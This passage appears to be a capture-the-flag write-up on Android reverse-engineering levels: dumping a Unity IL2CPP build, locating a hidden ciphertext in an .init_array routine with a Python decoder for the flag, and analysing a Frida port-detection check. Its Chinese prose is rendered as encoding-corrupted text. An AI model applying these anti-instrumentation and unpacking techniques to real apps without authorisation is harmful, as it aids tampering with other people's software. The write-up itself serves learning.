href="#GAME-level6" class="headerlink" title="GAME-level6"></a>GAME-level6</h1><p>ç¬¬ä¸€æ¬¡è§è¿™ä¸ªä¸œè¥¿ï¼Œè¿˜æŒºæ–°å¥‡hhhhh</p><p>å‘ç°æœ‰ä¸€ä¸ª Mono æ–‡ä»¶å¤¹ </p><p><img src="https://img.dkdun.cn/v1/2025/12/338a59f0d8c91616.png"></p><p>Unity ä½¿ç”¨ Mono æ–¹å¼æ‰“å‡ºæ¥çš„ apkï¼Œå¦‚æœæ²¡æœ‰åŠ å¯†æˆ‘ä»¬å¯ä»¥ç›´æ¥ä»åŒ…å†…æ‹¿åˆ° <code>Assembly-CSharp.dll</code>ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ <code>dnSpy.exe </code>å¯¹å…¶è¿›è¡Œåç¼–è¯‘ã€‚<br>å¦‚æœä½¿ç”¨ <code>IL2CPP</code> æ–¹å¼å‡ºåŒ…ï¼Œåˆ™æ²¡æœ‰ <code>Assembly-CSharp.dll</code>ï¼Œæœ‰ä¸€ä¸ª <code>IL2CppDumper</code> å·¥å…·ï¼Œ<a href="https://github.com/Perfare/Il2CppDumper%EF%BC%8C%E9%80%9A%E8%BF%87%E5%AE%83%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%86%E5%90%91%E5%BE%97%E5%88%B0">https://github.com/Perfare/Il2CppDumperï¼Œé€šè¿‡å®ƒï¼Œæˆ‘ä»¬å¯ä»¥é€†å‘å¾—åˆ°</a> <code>Assembly-CSharp.dll</code></p><p>åˆ›å»ºä¸€ä¸ª <code>input</code> å’Œ <code>output</code>ï¼Œå°† <code>libil2cpp.so</code> ä¸ <code>global-metadata.dat</code> æ‹·è´åˆ° <code>input</code> ç›®å½•ä¸­ï¼Œ</p><p><img src="https://img.dkdun.cn/v1/2025/12/acef11ddd1eea039.png"></p><p>å¯ä»¥åˆ›å»ºä¸€ä¸ªæ‰¹å¤„ç†æ–‡ä»¶åˆ° <code>input</code></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bat">..\Il2CppDumper.exe libil2cpp.so global-metadata.dat ..\output<br></code></pre></td></tr></table></figure><p>ç¯å¢ƒ <code>.NET</code> éœ€è¦ç”¨ <code>6.0.0</code> ç‰ˆæœ¬</p><p><img src="https://img.dkdun.cn/v1/2025/12/77a2c254193111c4.png"></p><p>ç„¶åæ‰“å¼€è¿™ä¸ª <code>.dll</code> æ–‡ä»¶å‘ç°æœ‰ä¸€ä¸ª <code>FlagText</code>ï¼Œä½†æ˜¯æ˜¯æ²¡æœ‰å†…å®¹çš„</p><p><img src="https://img.dkdun.cn/v1/2025/12/ff917dbc6e5c5c71.png"></p><p>æ‰“å¼€ <code>libil2cpp.so</code> ,åŠ è½½ IL2CppDumper æ–‡ä»¶å¤¹é‡Œçš„ ida_py3.py æ–‡ä»¶æŠŠ dump å‡ºæ¥çš„ script.json åŠ è½½è¿›å»,<code>FlagText</code> åç§»å€¼ä¸º <code>0x40</code>ï¼Œåœ¨ ida é‡Œé¢è·³è½¬ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ Flags å­—æ ·ï¼Œä½†æ˜¯è¿˜æ˜¯ä»€ä¹ˆéƒ½æ²¡æœ‰</p><p>æŸ¥çœ‹ <code>LoadLevel</code> å‡½æ•°ï¼ŒåŠ è½½åˆ°äº† <code>UnityEngine_Transform__SetParent_8767024</code> å‡½æ•°ï¼Œä½†æ˜¯æˆ‘ ida åé¢åŠ è½½ä¸å‡ºæ¥äº†ï¼Œå”‰å”‰å”‰</p><h1 id="Init-Array-level7"><a href="#Init-Array-level7" class="headerlink" title="Init_Array-level7"></a>Init_Array-level7</h1><p>çœ‹æºç ï¼Œè°ƒç”¨äº† <code>native</code> å±‚ <code>Check</code>ï¼Œå› æ­¤å°±åº”è¯¥å»åˆ†æ <code>.so</code> æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.swdd.summertrain;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> com.swdd.summertrain.databinding.ActivityMainBinding;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-keyword">private</span> ActivityMainBinding binding;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.loadLibrary(<span class="hljs-string">&quot;summertrain&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> Boolean <span class="hljs-title function_">Check</span><span class="hljs-params">(String arg1)</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View V)</span> &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.Check(((TextView)<span class="hljs-built_in">this</span>.findViewById(id.input)).getText().toString()).booleanValue()) &#123;<br>            Toast.makeText(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Good!&quot;</span>, <span class="hljs-number">0</span>).show();<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        Toast.makeText(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Try Again&quot;</span>, <span class="hljs-number">0</span>).show();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span>  <span class="hljs-comment">// androidx.fragment.app.FragmentActivity</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        <span class="hljs-type">ActivityMainBinding</span> <span class="hljs-variable">activityMainBinding0</span> <span class="hljs-operator">=</span> ActivityMainBinding.inflate(<span class="hljs-built_in">this</span>.getLayoutInflater());<br>        <span class="hljs-built_in">this</span>.binding = activityMainBinding0;<br>        <span class="hljs-built_in">this</span>.setContentView(activityMainBinding0.getRoot());<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ <code>Java_com_swdd_summertrain_MainActivity_Check</code> å‡½æ•°</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">Java_com_swdd_summertrain_MainActivity_Check</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="hljs-function"></span>&#123;<br>    ...<br>  v3 = a3;<br>  v4 = <span class="hljs-number">0LL</span>;<br>  v5 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + <span class="hljs-number">1352LL</span>))(a1, a3, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">if</span> ( !v5 )<br>    <span class="hljs-keyword">return</span> v4;<br>  v6 = v5;<br>  v26 = v3;<br>  v7 = <span class="hljs-built_in">strlen</span>(v5);<br>  v8 = (<span class="hljs-type">char</span> *)<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>[](v7 + <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> ( !v7 )<br>    <span class="hljs-keyword">goto</span> LABEL_11;<br>  <span class="hljs-keyword">if</span> ( v7 &lt; <span class="hljs-number">8</span> || v8 &lt; &amp;v6[v7] &amp;&amp; v6 &lt; &amp;v8[v7] )<br>  &#123;<br>    v9 = <span class="hljs-number">0LL</span>;<br>LABEL_7:<br>    v10 = v7 + ~v9;<br>    v11 = v7 &amp; <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">if</span> ( (v7 &amp; <span class="hljs-number">3</span>) != <span class="hljs-number">0</span> )<br>    &#123;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v8[v9] = ~v6[v9];<br>        ++v9;<br>        --v11;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v11 );<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v10 &gt;= <span class="hljs-number">3</span> )<br>    &#123;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v8[v9] = ~v6[v9];<br>        v8[v9 + <span class="hljs-number">1</span>] = ~v6[v9 + <span class="hljs-number">1</span>];<br>        v8[v9 + <span class="hljs-number">2</span>] = ~v6[v9 + <span class="hljs-number">2</span>];<br>        v8[v9 + <span class="hljs-number">3</span>] = ~v6[v9 + <span class="hljs-number">3</span>];<br>        v9 += <span class="hljs-number">4LL</span>;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v7 != v9 );<br>    &#125;<br>    <span class="hljs-keyword">goto</span> LABEL_11;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( v7 &gt;= <span class="hljs-number">0x20</span> )<br>  &#123;<br>    v9 = v7 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFE0LL</span>;<br>    v19 = (((v7 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFE0LL</span>) - <span class="hljs-number">32</span>) &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ( (v7 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFE0LL</span>) == <span class="hljs-number">32</span> )<br>    &#123;<br>      v21 = <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">if</span> ( (v19 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_22;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v20 = v19 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFELL</span>;<br>      v21 = <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v22 = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)&amp;v6[v21 + <span class="hljs-number">16</span>]), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v21] = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)&amp;v6[v21]), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v21 + <span class="hljs-number">16</span>] = v22;<br>        v23 = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)&amp;v6[v21 + <span class="hljs-number">48</span>]), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v21 + <span class="hljs-number">32</span>] = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)&amp;v6[v21 + <span class="hljs-number">32</span>]), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v21 + <span class="hljs-number">48</span>] = v23;<br>        v21 += <span class="hljs-number">64LL</span>;<br>        v20 -= <span class="hljs-number">2LL</span>;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v20 );<br>      <span class="hljs-keyword">if</span> ( (v19 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_22;<br>    &#125;<br>    v24 = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)&amp;v6[v21 + <span class="hljs-number">16</span>]), (__m128i)<span class="hljs-number">-1LL</span>);<br>    *(__m128i *)&amp;v8[v21] = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)&amp;v6[v21]), (__m128i)<span class="hljs-number">-1LL</span>);<br>    *(__m128i *)&amp;v8[v21 + <span class="hljs-number">16</span>] = v24;<br>LABEL_22:<br>    <span class="hljs-keyword">if</span> ( v7 == v9 )<br>      <span class="hljs-keyword">goto</span> LABEL_11;<br>    <span class="hljs-keyword">if</span> ( (v7 &amp; <span class="hljs-number">0x18</span>) == <span class="hljs-number">0</span> )<br>      <span class="hljs-keyword">goto</span> LABEL_7;<br>    <span class="hljs-keyword">goto</span> LABEL_24;<br>  &#125;<br>  v9 = <span class="hljs-number">0LL</span>;<br>LABEL_24:<br>  v25 = v9;<br>  v9 = v7 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF8LL</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    *(_QWORD *)&amp;v8[v25] = _mm_xor_si128(_mm_loadl_epi64((<span class="hljs-type">const</span> __m128i *)&amp;v6[v25]), (__m128i)<span class="hljs-number">-1LL</span>).m128i_u64[<span class="hljs-number">0</span>];<br>    v25 += <span class="hljs-number">8LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v9 != v25 );<br>  <span class="hljs-keyword">if</span> ( v7 != v9 )<br>    <span class="hljs-keyword">goto</span> LABEL_7;<br>LABEL_11:<br>  v8[v7] = <span class="hljs-number">0</span>;<br>  v12 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( v7 == (<span class="hljs-type">int</span>)__strlen_chk(&amp;storedBytes, <span class="hljs-number">256LL</span>) )<br>    v12 = <span class="hljs-built_in">memcmp</span>(v8, &amp;storedBytes, v7) == <span class="hljs-number">0</span>;<br>  v13 = (*(__int64 (__fastcall **)(__int64, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_QWORD *)a1 + <span class="hljs-number">48LL</span>))(a1, <span class="hljs-string">&quot;java/lang/Boolean&quot;</span>);<br>  v14 = v13;<br>  v15 = (*(__int64 (__fastcall **)(__int64, __int64, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_QWORD *)a1 + <span class="hljs-number">264LL</span>))(<br>          a1,<br>          v13,<br>          <span class="hljs-string">&quot;&lt;init&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;(Z)V&quot;</span>);<br>  v4 = _JNIEnv::<span class="hljs-built_in">NewObject</span>(a1, v14, v15, v12, v16, v17, v26);<br>  (*(<span class="hljs-built_in">void</span> (__fastcall **)(__int64, __int64, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_QWORD *)a1 + <span class="hljs-number">1360LL</span>))(a1, v27, v6);<br>  <span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span>[](v8);<br>  <span class="hljs-keyword">return</span> v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤§æ¦‚æµç¨‹å’Œ â€œåŠ¨æ€æ³¨å†Œâ€ è¿™ä¸ªé¢˜å·®ä¸å¤šï¼Œå¯¹ä¼ å…¥å­—ç¬¦ä¸²æŒ‰ä½å–åï¼Œæœ€åå­˜å‚¨åœ¨ <code>storedBytes</code> ä¸­ï¼ŒæŠŠå¯†æ–‡æå–å‡ºæ¥ï¼Œè§£å‡ºæ¥å±…ç„¶æ˜¯å‡çš„ï¼Œwhat can i say.jpg</p><p><img src="https://img.dkdun.cn/v1/2025/12/ee3e640eabe6526b.png"></p><p>ç„¶åçœ‹äº†ä¸‹ <a href="https://bbs.kanxue.com/user-home-979679.htm">Shangwendada</a> çš„ã€Šå¯¹init_arrayæ®µè°ƒç”¨çš„æ–¹æ³•è¿›è¡ŒHookã€‹è¿™ç¯‡æ–‡ç« ï¼Œé¦–å…ˆæˆ‘ä»¬åœ¨ <code>segments</code> çª—å£ä¸­çœ‹åˆ°å„ä¸ªæ®µçš„åç§»ï¼Œæ‰¾åˆ°äº† <code>.init_array</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/2f5d4e6f30c67607.png"></p><p>æ‰¾åˆ°äº† <code>sub_17360</code> å‡½æ•°</p><p><img src="https://img.dkdun.cn/v1/2025/12/83eba5c9f480fd9f.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__int64 <span class="hljs-title">sub_17360</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">memcpy</span>(&amp;storedBytes, &amp;unk_CA70, <span class="hljs-number">0x100uLL</span>);<br>  <span class="hljs-keyword">return</span> __android_log_print(<span class="hljs-number">4LL</span>, <span class="hljs-string">&quot;GenFunction&quot;</span>, <span class="hljs-string">&quot;Gen function called.&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>åŸæ¥ <code>storedBytes</code> ä¿å­˜äº†ä» <code>unk_CA70</code> å¤åˆ¶çš„æ•°æ®ï¼Œé‚£ <code>unk_CA70</code> åº”è¯¥å°±æ˜¯æ­£ç¡®çš„å¯†æ–‡</p><p><img src="https://img.dkdun.cn/v1/2025/12/c2343f20172c0f9d.png"></p><p>exp ä¹Ÿæ˜¯å’Œä¹‹å‰é‚£ä¸ªé¢˜ä¸€æ ·ï¼Œæ¢ä¸€ä¸‹å¯†æ–‡å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">ida_chars = [<br>  <span class="hljs-number">0x99</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xB6</span>,<br>  <span class="hljs-number">0x91</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x82</span><br>]<br><br>decrypted_string = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(~byte &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> ida_chars)<br><span class="hljs-built_in">print</span>(decrypted_string)<br></code></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;EasyInitArray&#125;<br></code></pre></td></tr></table></figure><h1 id="Frida-ç«¯å£æ£€æµ‹-level8"><a href="#Frida-ç«¯å£æ£€æµ‹-level8" class="headerlink" title="Frida ç«¯å£æ£€æµ‹-level8"></a><strong>Frida ç«¯å£æ£€æµ‹</strong>-level8</h1><p>å…ˆåç¼–è¯‘ä¸€ä¸‹ï¼Œåœ¨ <code>native</code> å±‚è°ƒç”¨äº† <code>Check</code> å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.swdd.summertrain;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> com.swdd.summertrain.databinding.ActivityMainBinding;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-keyword">private</span> ActivityMainBinding binding;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.loadLibrary(<span class="hljs-string">&quot;summertrain&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> Boolean <span class="hljs-title function_">Check</span><span class="hljs-params">(String arg1)</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View view0)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> ((TextView)<span class="hljs-built_in">this</span>.findViewById(id.input)).getText().toString();<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.Check(s).booleanValue()) &#123;<br>            Toast.makeText(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Good! Your flag is flag&#123;&quot;</span> + s + <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-number">0</span>).show();<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        Toast.makeText(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Try Again&quot;</span>, <span class="hljs-number">0</span>).show();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span>  <span class="hljs-comment">// androidx.fragment.app.FragmentActivity</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle bundle0)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(bundle0);<br>        <span class="hljs-type">ActivityMainBinding</span> <span class="hljs-variable">activityMainBinding0</span> <span class="hljs-operator">=</span> ActivityMainBinding.inflate(<span class="hljs-built_in">this</span>.getLayoutInflater());<br>        <span class="hljs-built_in">this</span>.binding = activityMainBinding0;<br>        <span class="hljs-built_in">this</span>.setContentView(activityMainBinding0.getRoot());<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>æ²¡å•¥æœ‰ç”¨çš„ä¿¡æ¯ï¼Œç›´æ¥è¿è¡Œä¸€ä¸‹ç¨‹åºï¼Œæ­£å¸¸æ˜¯å¯ä»¥è¿è¡Œçš„ï¼Œåœ¨å¯åŠ¨äº† <code>frida</code> åç¨‹åºåœæ­¢è¿è¡Œäº†</p><p><img src="https://img.dkdun.cn/v1/2025/12/0cf6bfb81fd443cd.png"></p><p>è¿™ä¸ªæ—¶å€™å°±å¯ä»¥æŸ¥çœ‹ <code>.so</code>  æ–‡ä»¶äº†ï¼Œåœ¨ <code>segments</code> çª—å£ä¸­çœ‹å„ä¸ªæ®µçš„åç§»ï¼Œæ‰¾åˆ°äº† <code>.init_array</code> ç„¶åè¿›å…¥<code>sub_F40</code> å‡½æ•°</p><p>ä¸‹é¢çš„ä¸€å¤§å †ä»€ä¹ˆç©æ„å„¿æˆ‘ä¹Ÿçœ‹ä¸æ‡‚qwqï¼Œä½†æ˜¯å‰é¢æœ‰ä¸€ä¸ª <code>check_ports</code> å‡½æ•°</p><p><img src="https://img.dkdun.cn/v1/2025/12/308618ee3d58d3f3.png"></p><p>å¤§æ¦‚å†…å®¹æ˜¯é€šè¿‡ <code>connect</code> æ£€æµ‹è¿æ¥ <code>127.0.0.1</code> çš„ä¸¤ä¸ªç«¯å£æ£€æµ‹æ˜¯å¦è¢«è¿æ¥</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">*&amp;addr.s<span class="hljs-built_in">a_family</span> = <span class="hljs-number">0</span>xA2690002<span class="hljs-comment">;       </span><br>*addr.s<span class="hljs-built_in">a_data</span> = <span class="hljs-number">0</span>x8A5D<span class="hljs-comment">;              </span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªç½‘ç»œå­—èŠ‚è½¬æ¢çš„çŸ¥è¯†ç‚¹ï¼ˆemmmè®¡ç½‘çš„ä¸œè¥¿è¿˜æ²¡å­¦ï¼‰ï¼Œç½‘ç»œå­—èŠ‚åºæ˜¯å¤§ç«¯æ¨¡å¼ï¼ˆBig-Endianï¼‰ï¼Œè€Œä¸»æœºå­—èŠ‚åºå¯èƒ½æ˜¯å°ç«¯æ¨¡å¼ï¼ˆLittle-Endianï¼‰ï¼Œå…³äºè¿™ä¸ªå¤§å°ç«¯ï¼ˆæ­»å»çš„å›å¿†çªç„¶å¼€å§‹æ”»å‡»æˆ‘ï¼‰ï¼Œç®€å•è¯´ä¸€ä¸‹</p><ul><li>å¤§ç«¯å­—èŠ‚åºï¼ˆBig Endianï¼‰ï¼šæœ€é«˜æœ‰æ•ˆä½å­˜äºæœ€ä½å†…å­˜åœ°å€å¤„ï¼Œæœ€ä½æœ‰æ•ˆä½å­˜äºæœ€é«˜å†…å­˜å¤„</li><li>å°ç«¯å­—èŠ‚åºï¼ˆLittle Endianï¼‰ï¼šæœ€é«˜æœ‰æ•ˆä½å­˜äºæœ€é«˜å†…å­˜åœ°å€ï¼Œæœ€ä½æœ‰æ•ˆä½å­˜äºæœ€ä½å†…å­˜å¤„</li></ul><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ ¹æ®ä¿¡æ¯å¾—å‡ºç«¯å£</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">xA2690002</span>-&gt;</span><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">xA269</span>-&gt;</span><span class="hljs-number">0</span><span 